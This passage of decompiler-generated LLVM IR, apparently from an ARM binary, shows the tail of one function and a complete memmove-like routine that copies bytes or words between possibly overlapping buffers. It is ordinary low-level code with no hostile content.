  store i32 %v6_1542c, i32* %r0.global-to-local, align 4
  %v0_15430.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15430.pr, label %bb169, label %.thread16

bb169:                                            ; preds = %bb168
  %v1_15430 = load i32, i32* @ip, align 4
  %v2_15430 = trunc i32 %v1_15430 to i8
  %v4_15430 = inttoptr i32 %v6_1542c to i8*
  store i8 %v2_15430, i8* %v4_15430, align 1
  br label %.thread16

.thread16:                                        ; preds = %bb166, %bb167, %bb168, %bb169
  store i32 %v3_1513c, i32* %r0.global-to-local, align 4
  store i32 %v8_1513c, i32* @r4, align 4
  store i32 %v11_1513c, i32* @lr, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  ret i32 %v3_1513c

; uselistorder directives
  uselistorder i32 %v4_1540c, { 1, 0 }
  uselistorder i32 %v4_15404, { 1, 0 }
  uselistorder i32 %v6_15400, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_153fc, { 1, 0 }
  uselistorder i32 %v0_153f4, { 0, 2, 1 }
  uselistorder i32 %v4_153f0, { 0, 2, 1 }
  uselistorder i32 %v2_153e0, { 1, 0, 2 }
  uselistorder i32 %v1_153f049, { 1, 0 }
  uselistorder i32 %v24_153c4, { 0, 2, 1 }
  uselistorder i32 %v17_1537c, { 1, 0, 2 }
  uselistorder i32 %v14_1537c, { 1, 0, 2 }
  uselistorder i32 %v11_1537c, { 1, 0, 2 }
  uselistorder i32 %v8_1537c, { 1, 0, 2 }
  uselistorder i32 %v5_1537c, { 1, 0, 2 }
  uselistorder i32 %v2_1537c, { 1, 0, 2 }
  uselistorder i32 %v1_15388, { 1, 0, 2 }
  uselistorder i32 %v0_1537c, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_15380, { 1, 0 }
  uselistorder i32 %v0_153c4, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v24_15364, { 0, 2, 1 }
  uselistorder i32 %v17_1531c, { 1, 0, 2 }
  uselistorder i32 %v14_1531c, { 1, 0, 2 }
  uselistorder i32 %v11_1531c, { 1, 0, 2 }
  uselistorder i32 %v8_1531c, { 1, 0, 2 }
  uselistorder i32 %v5_1531c, { 1, 0, 2 }
  uselistorder i32 %v2_1531c, { 1, 0, 2 }
  uselistorder i32 %v1_15328, { 1, 0, 2 }
  uselistorder i32 %v0_1531c, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_15320, { 1, 0 }
  uselistorder i32 %v0_15364, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v24_15304, { 0, 2, 1 }
  uselistorder i32 %v17_152bc, { 1, 0, 2 }
  uselistorder i32 %v14_152bc, { 1, 0, 2 }
  uselistorder i32 %v11_152bc, { 1, 0, 2 }
  uselistorder i32 %v8_152bc, { 1, 0, 2 }
  uselistorder i32 %v5_152bc, { 1, 0, 2 }
  uselistorder i32 %v2_152bc, { 1, 0, 2 }
  uselistorder i32 %v1_152c8, { 1, 0, 2 }
  uselistorder i32 %v0_152bc, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_152c0, { 1, 0 }
  uselistorder i32 %v0_15304, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_152a4, { 0, 2, 1, 5, 3, 4 }
  uselistorder i32 %v1_1529c, { 2, 0, 1, 3, 5, 4 }
  uselistorder i32 %v0_1529c, { 1, 0 }
  uselistorder i32 %v0_1530437, { 2, 3, 0, 1 }
  uselistorder i32 %v0_15290, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_1528c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1527430, { 1, 0 }
  uselistorder i32 %v4_15260, { 1, 0 }
  uselistorder i32 %v4_15258, { 1, 0 }
  uselistorder i32 %v6_15254, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_15240, { 1, 0 }
  uselistorder i32 %v1_15238, { 1, 2, 0 }
  uselistorder i32 %v3_151fc, { 1, 0, 2 }
  uselistorder i1 %v4_151f8, { 1, 0, 2 }
  uselistorder i32 %v3_151f8, { 1, 0 }
  uselistorder i32 %v2_15204, { 0, 1, 3, 2 }
  uselistorder i32 %v1_151f496, { 2, 1, 0 }
  uselistorder i32 %v13_151f0, { 1, 0, 2 }
  uselistorder i32 %v1_151ec, { 2, 1, 0 }
  uselistorder i1 %v4_151e4, { 0, 2, 1, 3 }
  uselistorder i32 %v3_151e4, { 1, 0 }
  uselistorder i32 %v0_151e4, { 0, 2, 1 }
  uselistorder i32 %v1_151f0, { 1, 0, 6, 5, 4, 3, 2 }
  uselistorder i32 %v24_151d0, { 0, 2, 1 }
  uselistorder i32 %v0_151cc, { 1, 0 }
  uselistorder i32 %v0_151d0, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_151c0, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v0_151c0, { 1, 0 }
  uselistorder i32 %v0_151d063, { 1, 0 }
  uselistorder i32 %v1_151ac91, { 2, 1, 0 }
  uselistorder i32 %v13_151a8, { 1, 0, 2 }
  uselistorder i32 %v1_151a4, { 2, 1, 0 }
  uselistorder i1 %v4_1519c, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1519c, { 1, 0 }
  uselistorder i32 %v0_151c0.pre, { 1, 4, 0, 3, 2 }
  uselistorder i32 %v1_1518c, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v1_15178, { 8, 7, 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 %v1_151a8, { 6, 3, 0, 13, 14, 2, 5, 4, 11, 10, 9, 8, 7, 12, 1 }
  uselistorder i32 %v6_1516c, { 1, 0, 2 }
  uselistorder i32 %v1_15164, { 0, 2, 1 }
  uselistorder i32 %v1_15150, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1514c, { 1, 2, 0 }
  uselistorder i32 %v0_1514c, { 0, 2, 1, 3 }
  uselistorder i32 %v11_1513c, { 1, 0 }
  uselistorder i32 %v8_1513c, { 2, 1, 0 }
  uselistorder i32 %v3_1513c, { 2, 3, 7, 0, 1, 6, 4, 5, 8 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 23, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12, 13, 14, 24, 25, 21, 16, 15, 17, 18, 20, 19, 22, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 3, 37, 4, 38, 5, 39, 7, 6, 8, 9, 41, 11, 10, 12, 15, 14, 16, 13, 40, 17, 42, 43, 30, 18, 29, 2, 19, 31, 20, 28, 21, 32, 22, 34, 23, 33, 24, 25, 35, 26, 27, 36, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 38, 6, 39, 7, 8, 9, 40, 10, 41, 11, 42, 12, 13, 14, 15, 43, 35, 36, 37, 44, 45, 33, 16, 17, 29, 18, 30, 3, 28, 19, 20, 21, 22, 31, 23, 24, 25, 26, 27, 32, 34, 0, 1, 2 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 4, 3, 6, 7, 5, 8, 10, 9, 11 }
  uselistorder i1* %cpsr_n.global-to-local, { 7, 8, 9, 10, 1, 11, 4, 2, 3, 12, 13, 14, 5, 6, 30, 31, 32, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cpsr_c.global-to-local, { 6, 5, 7, 8, 11, 9, 10, 12, 1, 13, 4, 2, 3, 14, 15, 16, 17, 28, 29, 30, 31, 34, 32, 33, 35, 18, 19, 20, 0, 21, 22, 23, 25, 24, 26, 27 }
  uselistorder i8 0, { 4, 17, 18, 11, 19, 20, 0, 7, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 1, 40, 42, 39, 12, 41, 13, 43, 44, 38, 2, 15, 45, 46, 50, 47, 48, 49, 14, 51, 52, 53, 54, 55, 3, 56, 16, 57, 58, 59, 61, 62, 6, 65, 66, 67, 10, 63, 64, 8, 68, 69, 70, 9, 71, 5, 72, 73, 60, 74, 75, 76, 77 }
  uselistorder label %.thread16, { 3, 2, 1, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_15418, { 2, 0, 1 }
  uselistorder label %.thread14, { 5, 4, 3, 1, 2, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %thread-pre-split11._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_153e0, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb155, { 1, 0 }
  uselistorder label %dec_label_pc_15318, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_152b8, { 1, 0 }
  uselistorder label %dec_label_pc_15274, { 1, 0 }
  uselistorder label %.thread9, { 6, 5, 4, 1, 2, 3, 0 }
  uselistorder label %bb149, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread107, { 2, 1, 0 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %.thread97, { 2, 1, 0 }
  uselistorder label %bb141, { 1, 0 }
  uselistorder label %dec_label_pc_151dc, { 1, 0 }
  uselistorder label %dec_label_pc_151c8, { 1, 0 }
  uselistorder label %dec_label_pc_151c0, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %.thread92, { 2, 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %.thread1, { 4, 3, 1, 0, 2 }
  uselistorder label %bb131, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb127, { 1, 0 }
}

define i32 @function_15448(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15448:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp21 = ptrtoint i8* %arg1 to i32
  %v3_15448 = load i32, i32* @r4, align 4
  %v6_15448 = load i32, i32* @r5, align 4
  %v9_15448 = load i32, i32* @r6, align 4
  %v12_15448 = load i32, i32* @r7, align 4
  %v15_15448 = load i32, i32* @lr, align 4
  %v5_1544c = icmp ugt i8* %tmp, %arg1
  %v11_1544c = icmp eq i8* %tmp, %arg1
  store i1 %v11_1544c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp21, i32* @r5, align 4
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg3, i32* @ip, align 4
  store i32 %tmp21, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v11_1544c, label %dec_label_pc_1548c, label %dec_label_pc_1546c

dec_label_pc_1546c:                               ; preds = %dec_label_pc_15448
  %v3_1546c = add i32 %arg3, %arg2
  store i32 %v3_1546c, i32* @r3, align 4
  %v4_15470 = icmp ult i32 %tmp21, %v3_1546c
  %v10_15470 = icmp eq i32 %tmp21, %v3_1546c
  store i1 %v10_15470, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_15470, label %dec_label_pc_15478, label %dec_label_pc_15484

dec_label_pc_15478:                               ; preds = %dec_label_pc_1546c
  %v3_15478 = add i32 %tmp21, %arg3
  store i32 %v3_15478, i32* @r7, align 4
  %v4_1547c = icmp ugt i32 %v3_15478, %arg2
  %v10_1547c = icmp eq i32 %v3_15478, %arg2
  store i1 %v10_1547c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_1547c, label %dec_label_pc_1549c, label %dec_label_pc_15484

dec_label_pc_15484:                               ; preds = %dec_label_pc_15478, %dec_label_pc_1546c
  %tmp29 = bitcast i8* %arg1 to i16*
  %v6_15484 = call i32 @function_1513c(i16* %tmp29, i32 %arg2, i32 %arg3)
  store i32 %v6_15484, i32* @r5, align 4
  br label %dec_label_pc_1548c

dec_label_pc_1548c:                               ; preds = %dec_label_pc_15518, %dec_label_pc_15508, %dec_label_pc_1555c, %dec_label_pc_154bc, %dec_label_pc_154e8, %dec_label_pc_154e0, %dec_label_pc_154b4, %dec_label_pc_15448, %dec_label_pc_15484
  %v0_1548c = load i32, i32* @r5, align 4
  store i32 %v3_15448, i32* @r4, align 4
  store i32 %v6_15448, i32* @r5, align 4
  store i32 %v9_15448, i32* @r6, align 4
  store i32 %v12_15448, i32* @r7, align 4
  store i32 %v15_15448, i32* @lr, align 4
  ret i32 %v0_1548c

dec_label_pc_1549c:                               ; preds = %dec_label_pc_15478
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  %v2_154d0 = urem i32 %arg2, 4
  br i1 %v5_1544c, label %dec_label_pc_154a4, label %dec_label_pc_154d0

dec_label_pc_154a4:                               ; preds = %dec_label_pc_1549c
  %v2_154a8 = urem i32 %tmp21, 4
  %v9_154ac = icmp eq i32 %v2_154d0, %v2_154a8
  store i1 %v9_154ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_154ac, label %dec_label_pc_15554, label %dec_label_pc_154b4

dec_label_pc_154b4.loopexit:                      ; preds = %dec_label_pc_1557c
  store i1 %v7_15584, i1* %cpsr_z.global-to-local, align 1
  %v0_154b4.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_154b4

dec_label_pc_154b4:                               ; preds = %dec_label_pc_154b4.loopexit, %dec_label_pc_15574, %dec_label_pc_154a4
  %v2_154c412 = phi i32 [ %v4_15588, %dec_label_pc_154b4.loopexit ], [ %v1_155888, %dec_label_pc_15574 ], [ %tmp21, %dec_label_pc_154a4 ]
  %v0_154b4 = phi i32 [ %v0_154b4.pre, %dec_label_pc_154b4.loopexit ], [ %v0_15574, %dec_label_pc_15574 ], [ %arg3, %dec_label_pc_154a4 ]
  %v2_154b4 = icmp eq i32 %v0_154b4, 0
  store i1 %v2_154b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_154b4, label %dec_label_pc_1548c, label %dec_label_pc_154bc

dec_label_pc_154bc:                               ; preds = %dec_label_pc_154b4, %dec_label_pc_154bc.dec_label_pc_154bc_crit_edge
  %v2_154c4 = phi i32 [ %v5_154c4, %dec_label_pc_154bc.dec_label_pc_154bc_crit_edge ], [ %v2_154c412, %dec_label_pc_154b4 ]
  %v0_154c0 = phi i32 [ %v0_154c0.pre, %dec_label_pc_154bc.dec_label_pc_154bc_crit_edge ], [ %v0_154b4, %dec_label_pc_154b4 ]
  %v0_154bc = load i32, i32* @r6, align 4
  %v1_154bc = inttoptr i32 %v0_154bc to i8*
  %v2_154bc = load i8, i8* %v1_154bc, align 1
  %v5_154bc = add i32 %v0_154bc, 1
  store i32 %v5_154bc, i32* @r6, align 4
  %v1_154c0 = add i32 %v0_154c0, -1
  store i32 %v1_154c0, i32* @ip, align 4
  %v7_154c0 = icmp eq i32 %v0_154c0, 1
  store i1 %v7_154c0, i1* %cpsr_z.global-to-local, align 1
  %v3_154c4 = inttoptr i32 %v2_154c4 to i8*
  store i8 %v2_154bc, i8* %v3_154c4, align 1
  %v4_154c4 = load i32, i32* @r4, align 4
  %v5_154c4 = add i32 %v4_154c4, 1
  store i32 %v5_154c4, i32* @r4, align 4
  %v0_154c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_154c8, label %dec_label_pc_1548c, label %dec_label_pc_154bc.dec_label_pc_154bc_crit_edge

dec_label_pc_154bc.dec_label_pc_154bc_crit_edge:  ; preds = %dec_label_pc_154bc
  %v0_154c0.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_154bc

dec_label_pc_154d0:                               ; preds = %dec_label_pc_1549c
  store i32 %v2_154d0, i32* %r2.global-to-local, align 4
  %v2_154d4 = urem i32 %tmp21, 4
  %v9_154d8 = icmp eq i32 %v2_154d0, %v2_154d4
  store i1 %v9_154d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_154d8, label %dec_label_pc_15500, label %dec_label_pc_154e0

dec_label_pc_154e0.loopexit:                      ; preds = %dec_label_pc_1553c.dec_label_pc_1553c_crit_edge, %dec_label_pc_1553c.preheader
  %v7_15544.lcssa = phi i1 [ %v7_1554440, %dec_label_pc_1553c.preheader ], [ %v7_15544, %dec_label_pc_1553c.dec_label_pc_1553c_crit_edge ]
  store i1 %v7_15544.lcssa, i1* %cpsr_z.global-to-local, align 1
  %v0_154e0.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_154e0

dec_label_pc_154e0:                               ; preds = %dec_label_pc_154e0.loopexit, %dec_label_pc_15534, %dec_label_pc_154d0
  %v0_154e0 = phi i32 [ %v0_154e0.pre, %dec_label_pc_154e0.loopexit ], [ %v0_15534, %dec_label_pc_15534 ], [ %arg3, %dec_label_pc_154d0 ]
  %v2_154e0 = icmp eq i32 %v0_154e0, 0
  store i1 %v2_154e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_154e0, label %dec_label_pc_1548c, label %dec_label_pc_154e8

dec_label_pc_154e8:                               ; preds = %dec_label_pc_154e0, %dec_label_pc_154e8.dec_label_pc_154e8_crit_edge
  %v0_154e8 = phi i32 [ %v0_154e8.pre, %dec_label_pc_154e8.dec_label_pc_154e8_crit_edge ], [ %v0_154e0, %dec_label_pc_154e0 ]
  %v1_154e8 = add i32 %v0_154e8, -1
  store i32 %v1_154e8, i32* @ip, align 4
  %v1_154ec = load i32, i32* @lr, align 4
  %v2_154ec = add i32 %v1_154ec, %v1_154e8
  %v3_154ec = inttoptr i32 %v2_154ec to i8*
  %v4_154ec = load i8, i8* %v3_154ec, align 1
  %v2_154f0 = icmp eq i32 %v1_154e8, 0
  store i1 %v2_154f0, i1* %cpsr_z.global-to-local, align 1
  %v3_154f4 = load i32, i32* @r5, align 4
  %v4_154f4 = add i32 %v3_154f4, %v1_154e8
  %v5_154f4 = inttoptr i32 %v4_154f4 to i8*
  store i8 %v4_154ec, i8* %v5_154f4, align 1
  %v0_154f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_154f8, label %dec_label_pc_1548c, label %dec_label_pc_154e8.dec_label_pc_154e8_crit_edge

dec_label_pc_154e8.dec_label_pc_154e8_crit_edge:  ; preds = %dec_label_pc_154e8
  %v0_154e8.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_154e8

dec_label_pc_15500:                               ; preds = %dec_label_pc_154d0
  %v1_15500 = urem i32 %v3_15478, 4
  %v2_15500 = icmp eq i32 %v1_15500, 0
  store i1 %v2_15500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15500, label %dec_label_pc_15534, label %dec_label_pc_15508

dec_label_pc_15508:                               ; preds = %dec_label_pc_15500
  %v1_15508 = add i32 %arg3, -1
  store i32 %v1_15508, i32* @ip, align 4
  %v2_15508 = icmp eq i32 %arg3, 0
  %v7_15508 = icmp eq i32 %arg3, 1
  store i1 %v7_15508, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15508, label %dec_label_pc_1548c, label %dec_label_pc_15520.preheader

dec_label_pc_15520.preheader:                     ; preds = %dec_label_pc_15508
  %v4_1550c = add i32 %v1_15508, %tmp21
  store i32 %v4_1550c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15520

dec_label_pc_15518:                               ; preds = %dec_label_pc_15520
  %v1_15518 = add i32 %v0_15534.pre, -1
  store i32 %v1_15518, i32* @ip, align 4
  %v2_15518 = icmp eq i32 %v0_15534.pre, 0
  %v7_15518 = icmp eq i32 %v0_15534.pre, 1
  store i1 %v7_15518, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15518, label %dec_label_pc_1548c, label %dec_label_pc_15518.dec_label_pc_15520_crit_edge

dec_label_pc_15518.dec_label_pc_15520_crit_edge:  ; preds = %dec_label_pc_15518
  %v1_15520.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_15520

dec_label_pc_15520:                               ; preds = %dec_label_pc_15518.dec_label_pc_15520_crit_edge, %dec_label_pc_15520.preheader
  %v0_15524 = phi i32 [ %v4_1550c, %dec_label_pc_15520.preheader ], [ %v1_1552c, %dec_label_pc_15518.dec_label_pc_15520_crit_edge ]
  %v1_15520 = phi i32 [ %arg2, %dec_label_pc_15520.preheader ], [ %v1_15520.pre, %dec_label_pc_15518.dec_label_pc_15520_crit_edge ]
  %v0_15520 = phi i32 [ %v1_15508, %dec_label_pc_15520.preheader ], [ %v1_15518, %dec_label_pc_15518.dec_label_pc_15520_crit_edge ]
  %v2_15520 = add i32 %v0_15520, %v1_15520
  %v3_15520 = inttoptr i32 %v2_15520 to i8*
  %v4_15520 = load i8, i8* %v3_15520, align 1
  %v1_15524 = urem i32 %v0_15524, 4
  %v2_15524 = icmp eq i32 %v1_15524, 0
  store i1 %v2_15524, i1* %cpsr_z.global-to-local, align 1
  %v3_15528 = inttoptr i32 %v0_15524 to i8*
  store i8 %v4_15520, i8* %v3_15528, align 1
  %v0_1552c = load i32, i32* %r2.global-to-local, align 4
  %v1_1552c = add i32 %v0_1552c, -1
  store i32 %v1_1552c, i32* %r2.global-to-local, align 4
  %v0_15530 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_15534.pre = load i32, i32* @ip, align 4
  br i1 %v0_15530, label %dec_label_pc_15534, label %dec_label_pc_15518

dec_label_pc_15534:                               ; preds = %dec_label_pc_15520, %dec_label_pc_15500
  %v0_15534 = phi i32 [ %arg3, %dec_label_pc_15500 ], [ %v0_15534.pre, %dec_label_pc_15520 ]
  %v7_15534 = icmp eq i32 %v0_15534, 3
  store i1 %v7_15534, i1* %cpsr_z.global-to-local, align 1
  %tmp53 = icmp ult i32 %v0_15534, 4
  br i1 %tmp53, label %dec_label_pc_154e0, label %dec_label_pc_1553c.preheader

dec_label_pc_1553c.preheader:                     ; preds = %dec_label_pc_15534
  %v1_1553c34 = add i32 %v0_15534, -4
  store i32 %v1_1553c34, i32* @ip, align 4
  %v1_1554035 = load i32, i32* @lr, align 4
  %v2_1554036 = add i32 %v1_1554035, %v1_1553c34
  %v3_1554037 = inttoptr i32 %v2_1554036 to i32*
  %v4_1554038 = load i32, i32* %v3_1554037, align 4
  %v2_1554439 = icmp ugt i32 %v1_1553c34, 2
  %v7_1554440 = icmp eq i32 %v1_1553c34, 3
  %v2_1554841 = load i32, i32* @r5, align 4
  %v3_1554842 = add i32 %v2_1554841, %v1_1553c34
  %v4_1554843 = inttoptr i32 %v3_1554842 to i32*
  store i32 %v4_1554038, i32* %v4_1554843, align 4
  %v2_1554c44 = xor i1 %v7_1554440, true
  %v3_1554c45 = and i1 %v2_1554439, %v2_1554c44
  br i1 %v3_1554c45, label %dec_label_pc_1553c.dec_label_pc_1553c_crit_edge, label %dec_label_pc_154e0.loopexit

dec_label_pc_1553c.dec_label_pc_1553c_crit_edge:  ; preds = %dec_label_pc_1553c.preheader, %dec_label_pc_1553c.dec_label_pc_1553c_crit_edge
  %v0_1553c.pre = load i32, i32* @ip, align 4
  %v1_1553c = add i32 %v0_1553c.pre, -4
  store i32 %v1_1553c, i32* @ip, align 4
  %v1_15540 = load i32, i32* @lr, align 4
  %v2_15540 = add i32 %v1_15540, %v1_1553c
  %v3_15540 = inttoptr i32 %v2_15540 to i32*
  %v4_15540 = load i32, i32* %v3_15540, align 4
  %v2_15544 = icmp ugt i32 %v1_1553c, 2
  %v7_15544 = icmp eq i32 %v1_1553c, 3
  %v2_15548 = load i32, i32* @r5, align 4
  %v3_15548 = add i32 %v2_15548, %v1_1553c
  %v4_15548 = inttoptr i32 %v3_15548 to i32*
  store i32 %v4_15540, i32* %v4_15548, align 4
  %v2_1554c = xor i1 %v7_15544, true
  %v3_1554c = and i1 %v2_15544, %v2_1554c
  br i1 %v3_1554c, label %dec_label_pc_1553c.dec_label_pc_1553c_crit_edge, label %dec_label_pc_154e0.loopexit

dec_label_pc_15554:                               ; preds = %dec_label_pc_154a4
  %v2_15554 = icmp eq i32 %v2_154d0, 0
  store i1 %v2_15554, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15554, label %dec_label_pc_15574, label %dec_label_pc_1555c

dec_label_pc_1555c:                               ; preds = %dec_label_pc_15554, %dec_label_pc_15564
  %v2_15568 = phi i32 [ %v5_15568, %dec_label_pc_15564 ], [ %tmp21, %dec_label_pc_15554 ]
  %v0_1555c = phi i32 [ %v0_15574.pre, %dec_label_pc_15564 ], [ %arg3, %dec_label_pc_15554 ]
  %v1_1555c = add i32 %v0_1555c, -1
  store i32 %v1_1555c, i32* @ip, align 4
  %v2_1555c = icmp eq i32 %v0_1555c, 0
  %v7_1555c = icmp eq i32 %v0_1555c, 1
  store i1 %v7_1555c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1555c, label %dec_label_pc_1548c, label %dec_label_pc_15564

dec_label_pc_15564:                               ; preds = %dec_label_pc_1555c
  %v0_15564 = load i32, i32* @r6, align 4
  %v1_15564 = inttoptr i32 %v0_15564 to i8*
  %v2_15564 = load i8, i8* %v1_15564, align 1
  %v5_15564 = add i32 %v0_15564, 1
  store i32 %v5_15564, i32* @r6, align 4
  %v3_15568 = inttoptr i32 %v2_15568 to i8*
  store i8 %v2_15564, i8* %v3_15568, align 1
  %v4_15568 = load i32, i32* @r4, align 4
  %v5_15568 = add i32 %v4_15568, 1
  store i32 %v5_15568, i32* @r4, align 4
  %v1_1556c = urem i32 %v5_15568, 4
  %v2_1556c = icmp eq i32 %v1_1556c, 0
  store i1 %v2_1556c, i1* %cpsr_z.global-to-local, align 1
  %v0_15574.pre = load i32, i32* @ip, align 4
  br i1 %v2_1556c, label %dec_label_pc_15574, label %dec_label_pc_1555c

dec_label_pc_15574:                               ; preds = %dec_label_pc_15564, %dec_label_pc_15554
  %v1_155888 = phi i32 [ %tmp21, %dec_label_pc_15554 ], [ %v5_15568, %dec_label_pc_15564 ]
  %v0_15574 = phi i32 [ %arg3, %dec_label_pc_15554 ], [ %v0_15574.pre, %dec_label_pc_15564 ]
  %v7_15574 = icmp eq i32 %v0_15574, 3
  store i1 %v7_15574, i1* %cpsr_z.global-to-local, align 1
  %tmp54 = icmp ult i32 %v0_15574, 4
  br i1 %tmp54, label %dec_label_pc_154b4, label %dec_label_pc_1557c

dec_label_pc_1557c:                               ; preds = %dec_label_pc_15574, %dec_label_pc_1557c.dec_label_pc_1557c_crit_edge
  %v1_15588 = phi i32 [ %v4_15588, %dec_label_pc_1557c.dec_label_pc_1557c_crit_edge ], [ %v1_155888, %dec_label_pc_15574 ]
  %v0_1557c = phi i32 [ %v0_1557c.pre, %dec_label_pc_1557c.dec_label_pc_1557c_crit_edge ], [ %v0_15574, %dec_label_pc_15574 ]
  %v1_1557c = add i32 %v0_1557c, -4
  store i32 %v1_1557c, i32* @ip, align 4
  %v0_15580 = load i32, i32* @r6, align 4
  %v1_15580 = inttoptr i32 %v0_15580 to i32*
  %v2_15580 = load i32, i32* %v1_15580, align 4
  %v4_15580 = add i32 %v0_15580, 4
  store i32 %v4_15580, i32* @r6, align 4
  %v2_15584 = icmp ugt i32 %v1_1557c, 2
  %v7_15584 = icmp eq i32 %v1_1557c, 3
  %v2_15588 = inttoptr i32 %v1_15588 to i32*
  store i32 %v2_15580, i32* %v2_15588, align 4
  %v3_15588 = load i32, i32* @r4, align 4
  %v4_15588 = add i32 %v3_15588, 4
  store i32 %v4_15588, i32* @r4, align 4
  %v2_1558c = xor i1 %v7_15584, true
  %v3_1558c = and i1 %v2_15584, %v2_1558c
  br i1 %v3_1558c, label %dec_label_pc_1557c.dec_label_pc_1557c_crit_edge, label %dec_label_pc_154b4.loopexit

dec_label_pc_1557c.dec_label_pc_1557c_crit_edge:  ; preds = %dec_label_pc_1557c
  %v0_1557c.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_1557c

; uselistorder directives
  uselistorder i32 %v4_15588, { 2, 0, 1 }
  uselistorder i32 %v0_15574, { 1, 0, 3, 2 }
  uselistorder i32 %v5_15568, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1555c, { 0, 2, 1 }
  uselistorder i32 %v1_1553c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_15534, { 1, 0, 3, 2 }
  uselistorder i32 %v0_15534.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1552c, { 1, 0 }
  uselistorder i32 %v0_15524, { 1, 0 }
  uselistorder i32 %v1_15508, { 1, 0, 2 }
  uselistorder i32 %v1_154e8, { 0, 2, 1, 3 }
  uselistorder i32 %v5_154c4, { 1, 0 }
  uselistorder i32 %v2_154d0, { 3, 1, 0, 2 }
  uselistorder i32 %tmp21, { 5, 2, 4, 0, 6, 1, 3, 8, 7, 9, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 4, 5, 6, 8, 9, 7, 10, 11, 12, 13, 14, 0, 15, 16, 17, 18, 1, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg3, { 3, 0, 4, 6, 8, 7, 5, 9, 11, 1, 2, 10, 12 }
  uselistorder i32 %arg2, { 2, 0, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i8* %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1557c, { 1, 0 }
  uselistorder label %dec_label_pc_1555c, { 1, 0 }
  uselistorder label %dec_label_pc_1553c.dec_label_pc_1553c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_154e8, { 1, 0 }
